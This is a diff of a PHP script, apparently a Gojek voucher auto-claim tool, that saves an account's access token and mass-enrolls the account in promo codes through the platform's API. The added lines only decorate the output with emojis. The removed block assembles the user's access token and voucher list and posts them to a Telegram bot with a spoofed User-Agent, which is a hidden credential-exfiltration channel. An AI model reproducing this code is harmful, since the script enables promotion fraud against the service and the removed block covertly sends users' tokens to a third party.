@@ -90,9 +90,9 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $uuid = getStr('"resource_owner_id":',',',$verif);
         echo color("white","+] Your access token : ".$token."\n\n");
         save("token.txt",$token);
-        echo color("nevy","\n▬▬▬▬▬▬▬▬▬▬▬▬AUTO CLAIM KAYANYA CUK▬▬▬▬▬▬▬▬▬▬▬▬");
-        echo "\n".color("yellow","CLAIM VOC A..");
-        echo "\n".color("red"," Please wait");
+        echo color("nevy","\n▬▬▬▬▬▬▬▬▬▬▬▬🔊AUTO CLAIM KAYANYA CUK🔊▬▬▬▬▬▬▬▬▬▬▬▬");
+        echo "\n".color("yellow"," 🥂CLAIM VOC A🥂.");
+        echo "\n".color("red","⏳▶️ Please wait");
         for($a=1;$a<=3;$a++){
         echo color("nevy",".");
         sleep(20);
@@ -105,8 +105,8 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         }else{
         echo "\n".color("yellow"," Message: ".$message);
 	gocar:
-        echo "\n".color("green"," CLAIM VOC B.. ");
-        echo "\n".color("red"," Please wait");
+        echo "\n".color("green"," 🥂 CLAIM VOC B🥂. ");
+        echo "\n".color("red"," ⏳▶️Please wait");
         for($a=1;$a<=3;$a++){
         echo color("nevy",".");
         sleep(20);
@@ -119,8 +119,8 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         }else{
         echo "\n".color("red"," Message: ".$message);
         gofood:
-        echo "\n".color("yellow"," CLAIM VOC C..");
-        echo "\n".color("green"," Please wait");
+        echo "\n".color("yellow"," 🥂 CLAIM VOC C🥂.");
+        echo "\n".color("green"," ⏳▶️Please wait");
         for($a=1;$a<=3;$a++){
         echo color("nevy",".");
         sleep(10);
@@ -128,8 +128,8 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2206"}');
         $message = fetch_value($code1,'"message":"','"');
         echo "\n".color("green"," Message: ".$message);
-        echo "\n".color("yellow"," CLAIM VOC EATLAH.");
-        echo "\n".color("red"," Please wait");
+        echo "\n".color("yellow"," 🥂 CLAIM VOC EATLAH🥂.");
+        echo "\n".color("red"," ⏳▶️Please wait");
         for($a=1;$a<=3;$a++){
         echo color("nevy",".");
         sleep(3);
@@ -169,32 +169,6 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         echo "\n".color("white","                     12. ".$voucher12);
         echo "\n".color("white","                     13. ".$voucher13);
         echo"\n";
-        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
-        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
-        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
-        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
-        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
-        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
-        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
-        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
-        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
-        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
-        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
-        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
-        $TOKEN  = ":";
-	$chatid = "";
-	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
-	$method	= "sendMessage";
-	$url    = "" . $TOKEN . "/". $method;
-	$post = [
- 		'chat_id' => $chatid,
-                'text' => $pesan
-        	];
-                $header = [
-                "X-Requested-With: XMLHttpRequest",
-                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
-                        ];
                                         $ch = curl_init();
                                         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                         curl_setopt($ch, CURLOPT_URL, $url);
